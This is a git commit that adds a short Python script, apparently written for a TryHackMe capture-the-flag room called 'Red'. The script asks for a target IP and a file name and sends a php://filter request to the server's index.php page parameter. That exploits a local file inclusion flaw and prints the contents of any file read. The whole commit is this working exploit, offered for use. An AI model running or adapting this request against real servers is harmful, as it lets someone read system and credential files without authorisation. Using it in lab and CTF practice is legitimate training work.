91277c2e72322d4470187c0098e4432155afaae2
Praison001 <60835238+Praison001@users.noreply.github.com>
2023-07-22 23:45:55 +0530

    Create LFIForTHM-Red.py
    Gets the files from the machine using the LFI vulnerability

---
+++ LFIForTHM-Red.py
@@ -0,0 +1,15 @@
+import requests
+
+#Getting the IP and the file to be accessed from the user
+IP = input("Enter the target IP: ")
+File= input("Enter the file that you want to access using LFI: ")
+
+def fetchingResponse(IP,File):
+	if IP and File:
+		response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
+		response_text = response.text
+		print(response_text)
+	else:
+		print("try again")
+		
+fetchingResponse(IP,File)
